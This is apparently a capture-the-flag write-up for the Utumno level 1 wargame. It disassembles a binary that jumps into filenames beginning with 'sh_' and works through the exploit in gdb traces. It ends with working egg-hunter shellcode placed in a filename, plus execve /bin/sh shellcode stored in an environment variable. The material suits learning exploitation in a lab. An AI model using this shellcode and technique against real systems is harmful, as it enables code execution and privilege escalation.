# Utumno 1

### Disassembly of main function

```assembly
080484a6 <main>:
 80484a6:       55                      push   %ebp
 80484a7:       89 e5                   mov    %esp,%ebp
 80484a9:       83 e4 f0                and    $0xfffffff0,%esp
 80484ac:       83 ec 20                sub    $0x20,%esp
 80484af:       8b 45 0c                mov    0xc(%ebp),%eax
 80484b2:       83 c0 04                add    $0x4,%eax
 80484b5:       8b 00                   mov    (%eax),%eax
 80484b7:       85 c0                   test   %eax,%eax
 80484b9:       75 0c                   jne    80484c7 <main+0x21>
 80484bb:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484c2:       e8 79 fe ff ff          call   8048340 <exit@plt>
 80484c7:       8b 45 0c                mov    0xc(%ebp),%eax
 80484ca:       83 c0 04                add    $0x4,%eax
 80484cd:       8b 00                   mov    (%eax),%eax
 80484cf:       89 04 24                mov    %eax,(%esp)
 80484d2:       e8 a9 fe ff ff          call   8048380 <opendir@plt>
 80484d7:       89 44 24 18             mov    %eax,0x18(%esp)
 80484db:       83 7c 24 18 00          cmpl   $0x0,0x18(%esp)
 80484e0:       75 0c                   jne    80484ee <main+0x48>
 80484e2:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484e9:       e8 52 fe ff ff          call   8048340 <exit@plt>
 80484ee:       eb 32                   jmp    8048522 <main+0x7c>
 80484f0:       8b 44 24 1c             mov    0x1c(%esp),%eax
 80484f4:       83 c0 0b                add    $0xb,%eax
 80484f7:       c7 44 24 08 03 00 00    movl   $0x3,0x8(%esp)
 80484fe:       00 
 80484ff:       89 44 24 04             mov    %eax,0x4(%esp)
 8048503:       c7 04 24 d0 85 04 08    movl   $0x80485d0,(%esp)
 804850a:       e8 61 fe ff ff          call   8048370 <strncmp@plt>
 804850f:       85 c0                   test   %eax,%eax
 8048511:       75 0f                   jne    8048522 <main+0x7c>
 8048513:       8b 44 24 1c             mov    0x1c(%esp),%eax
 8048517:       83 c0 0e                add    $0xe,%eax
 804851a:       89 04 24                mov    %eax,(%esp)
 804851d:       e8 6b ff ff ff          call   804848d <run>
 8048522:       8b 44 24 18             mov    0x18(%esp),%eax
 8048526:       89 04 24                mov    %eax,(%esp)
 8048529:       e8 32 fe ff ff          call   8048360 <readdir@plt>
 804852e:       89 44 24 1c             mov    %eax,0x1c(%esp)
 8048532:       83 7c 24 1c 00          cmpl   $0x0,0x1c(%esp)
 8048537:       75 b7                   jne    80484f0 <main+0x4a>
 8048539:       b8 00 00 00 00          mov    $0x0,%eax
 804853e:       c9                      leave  
 804853f:       c3                      ret
 ```
 
### Walkthrough

Here we can see argv[1] is used as the argument for the function call to opendir. The function opendir given a directory name, will return a pointer to the directory stream. The pointer is then stored on the stack to be uesd later on in the program. 

```assembly
 80484c7:       8b 45 0c                mov    0xc(%ebp),%eax
 80484ca:       83 c0 04                add    $0x4,%eax
 80484cd:       8b 00                   mov    (%eax),%eax
 80484cf:       89 04 24                mov    %eax,(%esp)
 80484d2:       e8 a9 fe ff ff          call   8048380 <opendir@plt>
 80484d7:       89 44 24 18             mov    %eax,0x18(%esp)
 80484db:       83 7c 24 18 00          cmpl   $0x0,0x18(%esp)
 80484d7:       89 44 24 18             mov    %eax,0x18(%esp)
 80484db:       83 7c 24 18 00          cmpl   $0x0,0x18(%esp)
 80484e0:       75 0c                   jne    80484ee <main+0x48>
```

The directory stream pointer is pulled off the stack and used as the argument to readdir. Readdir will return a pointer to a dirent (directory entry) struct of the next directory entry in the stream.

```assembly
8048522:       8b 44 24 18             mov    0x18(%esp),%eax
 8048526:       89 04 24                mov    %eax,(%esp)
 8048529:       e8 32 fe ff ff          call   8048360 <readdir@plt>
 804852e:       89 44 24 1c             mov    %eax,0x1c(%esp)
 8048532:       83 7c 24 1c 00          cmpl   $0x0,0x1c(%esp)
 8048537:       75 b7                   jne    80484f0 <main+0x4a>
```

```c
struct dirent {
    ino_t          d_ino;       /* inode number */
    off_t          d_off;       /* offset to the next dirent */
    unsigned short d_reclen;    /* length of this record */
    unsigned char  d_type;      /* type of file; not supported
                                   by all file system types */
    char           d_name[256]; /* filename */
};
```

If a valid dirent pointer is obtained, then using an offset of 0xb, the program will compare the string. $0x80485d0 is a pointer to "sh_". So 

```assembly
 80484f0:       8b 44 24 1c             mov    0x1c(%esp),%eax
 80484f4:       83 c0 0b                add    $0xb,%eax
 80484f7:       c7 44 24 08 03 00 00    movl   $0x3,0x8(%esp)
 80484fe:       00 
 80484ff:       89 44 24 04             mov    %eax,0x4(%esp)
 8048503:       c7 04 24 d0 85 04 08    movl   $0x80485d0,(%esp)
 804850a:       e8 61 fe ff ff          call   8048370 <strncmp@plt>
 804850f:       85 c0                   test   %eax,%eax
 8048511:       75 0f                   jne    8048522 <main+0x7c>
```

So at this point it is fairly obvious that a file will need to exist within the given directory that has the prefix "sh_".

GDB output when it has read in the directory entry of sh_AAAA file.

```assembly
[-------------------------------------code-------------------------------------]
   0x80484f7 <main+81>: mov    DWORD PTR [esp+0x8],0x3
   0x80484ff <main+89>: mov    DWORD PTR [esp+0x4],eax
   0x8048503 <main+93>: mov    DWORD PTR [esp],0x80485d0
=> 0x804850a <main+100>:        call   0x8048370 <strncmp@plt>
   0x804850f <main+105>:        test   eax,eax
   0x8048511 <main+107>:        jne    0x8048522 <main+124>
   0x8048513 <main+109>:        mov    eax,DWORD PTR [esp+0x1c]
   0x8048517 <main+113>:        add    eax,0xe
Guessed arguments:
arg[0]: 0x80485d0 --> 0x5f6873 ('sh_')
arg[1]: 0x804a04f ("sh_AAAA")
arg[2]: 0x3 
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0x80485d0 --> 0x5f6873 ('sh_')
0004| 0xffffd324 --> 0x804a04f ("sh_AAAA")
0008| 0xffffd328 --> 0x3 
0012| 0xffffd32c --> 0xf7fa9ff4 --> 0x192d7c 
0016| 0xffffd330 --> 0x8048540 (<__libc_csu_init>:      push   ebp)
0020| 0xffffd334 --> 0x8048390 (<_start>:       xor    ebp,ebp)
0024| 0xffffd338 --> 0x804a008 --> 0x3 
0028| 0xffffd33c --> 0x804a044 --> 0x2e52b9ee 
[------------------------------------------------------------------------------]
```

This is the code if the strncmp function passes and falls through the jump statement. The directory entry pointer is once again obtained and offset by 0xe. This is then used as the argument for run.

```
 8048513:       8b 44 24 1c             mov    0x1c(%esp),%eax
 8048517:       83 c0 0e                add    $0xe,%eax
 804851a:       89 04 24                mov    %eax,(%esp)
 804851d:       e8 6b ff ff ff          call   804848d <run>
```

Here is the GDB output before run is called.

```assembly
[-------------------------------------code-------------------------------------]
   0x8048513 <main+109>:        mov    eax,DWORD PTR [esp+0x1c]
   0x8048517 <main+113>:        add    eax,0xe
   0x804851a <main+116>:        mov    DWORD PTR [esp],eax
=> 0x804851d <main+119>:        call   0x804848d <run>
   0x8048522 <main+124>:        mov    eax,DWORD PTR [esp+0x18]
   0x8048526 <main+128>:        mov    DWORD PTR [esp],eax
   0x8048529 <main+131>:        call   0x8048360 <readdir@plt>
   0x804852e <main+136>:        mov    DWORD PTR [esp+0x1c],eax
Guessed arguments:
arg[0]: 0x804a052 ("AAAA")
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0x804a052 ("AAAA")
0004| 0xffffd324 --> 0x804a04f ("sh_AAAA")
0008| 0xffffd328 --> 0x3 
0012| 0xffffd32c --> 0xf7fa9ff4 --> 0x192d7c 
0016| 0xffffd330 --> 0x8048540 (<__libc_csu_init>:      push   ebp)
0020| 0xffffd334 --> 0x8048390 (<_start>:       xor    ebp,ebp)
0024| 0xffffd338 --> 0x804a008 --> 0x3 
0028| 0xffffd33c --> 0x804a044 --> 0x2e52b9ee 
[------------------------------------------------------------------------------]
```

After returning from run, the program jumps to the filename after "sh_", in this case "AAAA". So this signifies that shellcode could be placed in the filename.

```assembly
[-------------------------------------code-------------------------------------]
   0x804a04c:   adc    al,0x0
   0x804a04e:   or     BYTE PTR [ebx+0x68],dh
   0x804a051:   pop    edi
=> 0x804a052:   inc    ecx
   0x804a053:   inc    ecx
   0x804a054:   inc    ecx
   0x804a055:   inc    ecx
   0x804a056:   add    BYTE PTR [eax],cl
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0x804a052 ("AAAA")
0004| 0xffffd324 --> 0x804a04f ("sh_AAAA")
0008| 0xffffd328 --> 0x3 
0012| 0xffffd32c --> 0xf7fa9ff4 --> 0x192d7c 
0016| 0xffffd330 --> 0x8048540 (<__libc_csu_init>:      push   ebp)
0020| 0xffffd334 --> 0x8048390 (<_start>:       xor    ebp,ebp)
0024| 0xffffd338 --> 0x804a008 --> 0x3 
0028| 0xffffd33c --> 0x804a044 --> 0x2e52b9ee 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a052 in ?? ()
gdb-peda$ x/x $eip
0x804a052:      0x41414141
gdb-peda$
```

### Shellcode

Using the normal x86 shellcode, and attempting to create a file with it unfortunately fails. This is because filenames cannot contain \x2f which is the backslash. So this shellcode will not work as the filename

```
touch: cannot touch `sh_1\300Ph//shh/bin\211\343PS\211\341\260\v̀': No such file or directory
```

A smallest alphanumeric shellcode was about 390 bytes, and the maxiumum filename is around 255 characters. So this is also not an option

### Solution

The final solution was to use an egg hunter shellcode which would use a tag to search for shellcode in the environment variables.

http://shell-storm.org/shellcode/files/shellcode-839.php

Create a file with `/tmp/vigorix/` with the prefix 'sh_' followed by the EGG hunter shellcode
 
 ```
 touch $(python -c 'print "sh_\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"')
 ```

Define EGG variable as shellcode

```
export EGG=$(python -c 'print "\x90\x50\x90\x50\x90\x50\x90\x50\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"')
```

While in `/tmp/vigorix/` call `/utumno/utumno1 .`
